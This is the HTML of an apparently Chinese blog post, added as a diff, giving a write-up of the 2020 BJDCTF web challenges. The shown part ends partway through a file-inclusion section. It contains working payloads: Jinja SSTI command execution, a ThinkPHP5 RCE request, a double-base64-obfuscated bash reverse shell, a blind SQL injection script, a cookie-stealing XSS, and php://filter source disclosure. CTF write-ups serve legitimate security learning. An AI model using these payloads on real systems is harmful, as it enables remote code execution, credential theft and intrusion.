@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="YGm-O0FYtJIJd878GKblZACh8xSr46g0l4F5UDGhoTc">
+  <meta name="baidu-site-verification" content="code-tyOuGzoN3z">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.css">
+  <script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yanmymickey.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="2020第二届BJDCTFWEBfakegoogle源码注释是SSTI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020第二届BJDCTF">
+<meta property="og:url" content="https://yanmymickey.github.io/2020/03/23/CTF_WP/BJDCTFWP/index.html">
+<meta property="og:site_name" content="菜鸡的BLOG">
+<meta property="og:description" content="2020第二届BJDCTFWEBfakegoogle源码注释是SSTI">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-22T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-16T02:36:23.002Z">
+<meta property="article:author" content="D15h35">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://yanmymickey.github.io/2020/03/23/CTF_WP/BJDCTFWP/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<title>2020第二届BJDCTF | 菜鸡的BLOG</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XZVDBPC6X7"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-XZVDBPC6X7');
+      }
+    </script>
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?633ffcf7a0f511eb45dead6c18798c6f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="菜鸡的BLOG" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">菜鸡的BLOG</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">31</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">16</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">58</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF"><span class="nav-number">1.</span> <span class="nav-text">2020第二届BJDCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fakegoogle"><span class="nav-number">1.1.1.</span> <span class="nav-text">fakegoogle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#old-hack"><span class="nav-number">1.1.2.</span> <span class="nav-text">old_hack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#duangshell"><span class="nav-number">1.1.3.</span> <span class="nav-text">duangshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.4.</span> <span class="nav-text">简单注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="nav-number">1.1.5.</span> <span class="nav-text">假猪套天下第一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Schro%CC%88dinger"><span class="nav-number">1.1.6.</span> <span class="nav-text">Schrödinger</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E4%B9%8B%E5%85%89"><span class="nav-number">1.1.7.</span> <span class="nav-text">XSS之光</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#elementmaster"><span class="nav-number">1.1.8.</span> <span class="nav-text">elementmaster</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B"><span class="nav-number">1.1.9.</span> <span class="nav-text">文件探测</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">1.2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E7%AE%80%E5%8D%95MISC"><span class="nav-number">1.2.1.</span> <span class="nav-text">最简单MISC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#A-Beautiful-Picture"><span class="nav-number">1.2.2.</span> <span class="nav-text">A_Beautiful_Picture</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyBaBa"><span class="nav-number">1.2.3.</span> <span class="nav-text">EasyBaBa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="nav-number">1.2.4.</span> <span class="nav-text">小姐姐</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0-y1ng"><span class="nav-number">1.3.1.</span> <span class="nav-text">签到-y1ng</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%81%E6%96%87%E7%9B%B2"><span class="nav-number">1.3.2.</span> <span class="nav-text">老文盲</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%87%95%E8%A8%80%E7%87%95%E8%AF%AD"><span class="nav-number">1.3.3.</span> <span class="nav-text">燕言燕语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%81%B5%E8%83%BD%E7%B2%BE%E9%80%9A"><span class="nav-number">1.3.4.</span> <span class="nav-text">灵能精通</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cat-flag"><span class="nav-number">1.3.5.</span> <span class="nav-text">cat_flag</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D15h35"
+      src="/images/while.png">
+  <p class="site-author-name" itemprop="name">D15h35</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yanmymickey" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yanmymickey" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/yanmymickey" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://yanmymickey.github.io/2020/03/23/CTF_WP/BJDCTFWP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/while.png">
+      <meta itemprop="name" content="D15h35">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸡的BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020第二届BJDCTF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-03-23 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-23T00:00:00+08:00">2020-03-23</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-01-16 10:36:23" itemprop="dateModified" datetime="2021-01-16T10:36:23+08:00">2021-01-16</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/WP/" itemprop="url" rel="index"><span itemprop="name">WP</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="2020第二届BJDCTF"><a href="#2020第二届BJDCTF" class="headerlink" title="2020第二届BJDCTF"></a>2020第二届BJDCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="fakegoogle"><a href="#fakegoogle" class="headerlink" title="fakegoogle"></a>fakegoogle</h3><p>源码注释是SSTI</p>
+<a id="more"></a>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">&#x2F;qaq?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><p>利用的是thinkphp5的RCE漏洞</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;a06ef095-a650-4053-96ad-444239c9d4db.node3.buuoj.cn&#x2F;?s&#x3D;captcha</span><br><span class="line">post data:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+<h3 id="duangshell"><a href="#duangshell" class="headerlink" title="duangshell"></a>duangshell</h3><p>下载.index.php.swp,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim index.php</span><br><span class="line">#按R还原出源码</span><br></pre></td></tr></table></figure>
+<p>注册小号申请靶机,ifconfig得到靶机的ip,利用bash构造一句话反弹shell,两次base编码后发送payload</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ec&#39;&#39;ho &quot;WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE56UXVNUzQwT0M0M01DODRPRGc0SURBK0pqRT0&#x3D;&quot;|bas&#39;&#39;e64 -d|bas&#39;&#39;e64 -d|bash</span><br></pre></td></tr></table></figure>
+<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><p>注入脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;796d3f72-9ab1-4366-a553-0f1bee62ea1c.node3.buuoj.cn&#x2F;&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    high &#x3D; 127</span><br><span class="line">    low &#x3D; 32</span><br><span class="line">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">    while high &gt; low:</span><br><span class="line">        # password&#x3D;&#39;or ascii(substr(username,%s,1))&gt;%s#&#39;%(str(i),str(mid))</span><br><span class="line">        password &#x3D; &#39;or ascii(substr(password,%s,1))&gt;%s#&#39; % (str(i), str(mid))</span><br><span class="line">        payload &#x3D; &#123;&#39;username&#39;:&quot;\\&quot;, &#39;password&#39;:password&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        r&#x3D;requests.post(url,data&#x3D;payload)</span><br><span class="line">        if &#39;BJD needs to be stronger&#39; in r.text:</span><br><span class="line">            low &#x3D; mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high &#x3D; mid</span><br><span class="line">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">        print(chr(int(mid)),end&#x3D;&quot;&quot;)</span><br><span class="line">    flag+&#x3D;chr(int(mid))</span><br><span class="line">    print(&quot; | &quot;+flag)</span><br><span class="line">#结果,登录得到flag</span><br><span class="line">admin</span><br><span class="line">OhyOuFOuNdit</span><br></pre></td></tr></table></figure>
+<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>登录admin提示不是admin,随便输一个test,登录上,抓包发现注释L0g1n.php</p>
+<p>访问L0g1n.php.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#提示</span><br><span class="line">Sorry, this site will be available after totally 99 years!</span><br><span class="line">#查看cookies发现有个time</span><br><span class="line">改成9999999999</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who comes from localhost</span><br><span class="line">修改X-Forwarded-For:127.0.0.1</span><br><span class="line">#提示</span><br><span class="line">Do u think that I dont know X-Forwarded-For?Too young too simple sometimes naive</span><br><span class="line">#修改Client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who come from gem-love.com</span><br><span class="line">#修改Referer:gem-love.com</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for browsers that run on Commodo 64</span><br><span class="line">#修改User-Agent:Commodo 64</span><br><span class="line">#提示</span><br><span class="line">no no no i think it is not the real commmodo 64,what is the real ua for Commdo?</span><br><span class="line">#google commmodo 64有一中计算机叫Commodore 64</span><br><span class="line">#修改User-Agent:Commodore 64</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those whose email is root@gem-love.com</span><br><span class="line">#google http head email 发现有一个头叫from</span><br><span class="line">#修改From:root@gem-love.com</span><br><span class="line"></span><br><span class="line">#提示</span><br><span class="line">Sorry, this site is only optimized for those who use the http proxy of y1ng.vip if you dont have the proxy, pls contact us to buy, ￥100&#x2F;Month</span><br><span class="line">#Via 代理服务器的相关信息</span><br><span class="line">#修改Via:y1ng.vip</span><br><span class="line"></span><br><span class="line">#F12查看元素</span><br><span class="line">&lt;!--ZmxhZ3tlYzI2ZmNhMS1mYWRmLTQ0YmItYTEyYS1lNjdjOWU5NTg3Nzh9Cg&#x3D;&#x3D;--&gt;</span><br><span class="line">base64解码</span><br><span class="line">flag&#123;ec26fca1-fadf-44bb-a12a-e67c9e958778&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>查看网页源代码有个test.php,过去看一眼是登录框,首页是一个密码爆破,于是让他自己爆破自己</p>
+<p>登录框输入<code>http://127.0.0.1/test.php</code>,按input,弹窗提示URL Confirmed.查看cookies</p>
+<p><code>dXNlcg=MTU4NTAxNTkwMw%3D%3D</code>base64解码得到user=1585015903,用edit cookies插件置空,刷新页面99%了,点check,得到av号,查看评论区按时间排序,查看最近的评论,得到flag</p>
+<h3 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h3><p>扫目录发现git泄露,githack恢复得到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; $_GET[&#39;yds_is_so_beautiful&#39;];</span><br><span class="line">echo unserialize($a);</span><br><span class="line">&lt;?php</span><br><span class="line">#利用原生类xss</span><br><span class="line">$a &#x3D; new Exception(&#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;);</span><br><span class="line">#由于源代码有个echo直接反序列化字符串</span><br><span class="line">$a &#x3D; &#39;&lt;script&gt;window.open(document.cookie);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
+<p>传过去得到flag</p>
+<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>检查元素发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden&#x3D;&quot;&quot; id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+<p>hex解码得到Po.php</p>
+<p>使用bp遍历元素周期表中的元素.php</p>
+<p>得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php,访问得到flag</p>
+<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>head里面有hint home.php</p>
+<p>访问,发现url包含了system.php</p>
+<p>使用伪协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;system</span><br><span class="line">&#x2F;home.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;home</span><br></pre></td></tr></table></figure>
+<p>得到源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span 